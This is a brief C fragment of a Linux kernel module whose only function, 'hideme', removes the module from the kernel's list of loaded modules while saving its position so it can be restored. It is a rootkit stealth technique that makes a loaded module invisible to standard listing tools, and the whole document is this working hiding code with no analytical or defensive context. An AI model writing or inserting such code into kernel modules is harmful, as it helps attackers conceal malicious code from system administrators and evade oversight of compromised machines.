#include <linux/module.h>

struct list_head *prev_ent;

void hideme(void)
{
//saving a position in case of readding it to the list
	prev_ent = THIS_MODULE->list.prev;
//deleting module from linked list of modules		
	list_del(&THIS_MODULE->list);		
}
